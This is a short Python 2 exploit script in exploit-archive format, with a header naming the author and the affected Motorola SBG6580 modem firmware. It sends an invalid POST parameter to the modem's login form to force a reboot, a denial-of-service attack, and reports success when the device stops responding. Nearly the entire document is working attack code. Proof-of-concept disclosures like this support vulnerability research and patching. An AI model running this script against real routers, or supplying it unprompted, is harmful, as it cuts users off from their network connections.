# Date: 01/03/14
# Exploit Author: nicx0
# Vendor Homepage: http://www.motorola.com/
# Software Link: http://www.motorola.com/us/SBG6580-SURFboard%C2%AE-eXtreme-Wireless-Cable-Modem/70902.html
# Version: SBG6580-6.5.0.0-GA-00-226-NOSH
# POSTing a bad login page parameter causes the router to reboot.
 
import sys
import socket
import urllib2
import urllib
router_ip = &#039;&#039;
try:
      router_ip = str(sys.argv[1])
except:
      print &#039;motobug.py ip_address : e.g. motobug.py 192.168.0.1&#039;
      sys.exit(2)
query_args = {&#039;this_was&#039;:&#039;too_easy&#039;}
url = &#039;http://&#039; + router_ip + &#039;/goform/login&#039;
post_data = urllib.urlencode(query_args)
request = urllib2.Request(url, post_data)
try:
    print &#039;[+] Sending invalid POST request to &#039; + url + &#039;...&#039;
    response = urllib2.urlopen(request,timeout=5)
except socket.timeout:
    print &#039;[+] Success! No response from the modem.&#039;
except urllib2.HTTPError:
    print &#039;[-] Failed: HTTP error received. The modem might not be a SBG6580.&#039;
except urllib2.URLError:
    print &#039;[-] Failed: URL error received. Check the IP address again..&#039;
else:
    print &#039;[-] Failed: HTTP response received. Modem does not appear to be vulnerable.&#039;

